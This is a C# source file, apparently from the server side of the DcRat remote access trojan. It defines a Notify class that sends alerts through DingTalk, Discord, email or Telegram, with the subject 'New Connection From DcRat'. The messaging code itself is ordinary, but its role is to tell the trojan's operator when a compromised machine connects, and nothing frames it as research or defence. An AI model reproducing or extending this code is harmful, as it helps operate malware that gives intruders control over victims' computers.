using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Mail;
using System.Security.Cryptography;
using System.Text;
using System.Web;

namespace Server
{
    internal class Notify
    {
        public static void Send(string content)
        {
            if (Settings.notifyConfig.DingTalk)
                DingTalk(content);
            else if (Settings.notifyConfig.Discord)
                Discord(content);
            else if (Settings.notifyConfig.Mail)
                Mail(content);
            else if (Settings.notifyConfig.Telegram) Telegram(content);
        }

        public static void DingTalk(string content)
        {
            try
            {
                var ts = DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0, 0);
                var shijianchuo = (DateTime.Now.ToUniversalTime().Ticks - 621355968000000000) / 10000;
                var stringToSign = shijianchuo + "\n" + Settings.notifyConfig.DingTalkSecret;
                var encoding = new ASCIIEncoding();
                var keyByte = encoding.GetBytes(Settings.notifyConfig.DingTalkSecret);
                var messageBytes = encoding.GetBytes(stringToSign);
                string sign;
                using (var hmacsha256 = new HMACSHA256(keyByte))
                {
                    var hashmessage = hmacsha256.ComputeHash(messageBytes);
                    sign = HttpUtility.UrlEncode(Convert.ToBase64String(hashmessage), Encoding.UTF8);
                }

                var url = Settings.notifyConfig.DingTalkWebHook + "&timestamp=" + shijianchuo + "&sign=" + sign;

                var json = "{\"msgtype\":\"text\",\"text\":{\"content\":\"" + content + "\"}}";
                var req = (HttpWebRequest) WebRequest.Create(url);
                req.Method = "POST";
                req.ContentType = "application/json;charset=utf-8";

                var bytes = Encoding.UTF8.GetBytes(json);
                req.ContentLength = bytes.Length;
                using (var requestStream = req.GetRequestStream())
                {
                    requestStream.Write(bytes, 0, bytes.Length);
                }

                var resp = (HttpWebResponse) req.GetResponse();
                var stream = resp.GetResponseStream();
                using (var reader = new StreamReader(stream, Encoding.UTF8))
                {
                    reader.ReadToEnd();
                }
            }
            catch
            {
            }
        }

        public static void Telegram(string content)
        {
            try
            {
                var urlString = @"https://api.telegram.org/bot" + Settings.notifyConfig.TelegramApiToken +
                                @"/sendMessage?chat_id=" + Settings.notifyConfig.TelegramChannelID + "&text=" + content;
                new WebClient().DownloadString(urlString);
            }
            catch
            {
            }
        }

        public static void Mail(string content)
        {
            try
            {
                var from = new MailAddress(Settings.notifyConfig.MailFromAddress);
                var to = new MailAddress(Settings.notifyConfig.MailToAddress);
                var mailMessage = new MailMessage(from, to);
                mailMessage.Subject = "New Connection From DcRat";
                mailMessage.Body = content;

                var smtpClient = new SmtpClient(Settings.notifyConfig.MailSMTPAddress,
                    Settings.notifyConfig.MailSMTPPort);
                smtpClient.Credentials = new NetworkCredential(Settings.notifyConfig.MailFromAddress,
                    Settings.notifyConfig.MailPassword);
                smtpClient.Send(mailMessage);
            }
            catch
            {
            }
        }

        public static void Discord(string content)
        {
            try
            {
                var client = new HttpClient();
                var contents = new Dictionary<string, string>
                {
                    {"content", content},
                    {"username", "DcRat"}
                };

                client.PostAsync(Settings.notifyConfig.DiscordWebhook, new FormUrlEncodedContent(contents));
            }
            catch
            {
            }
        }
    }
}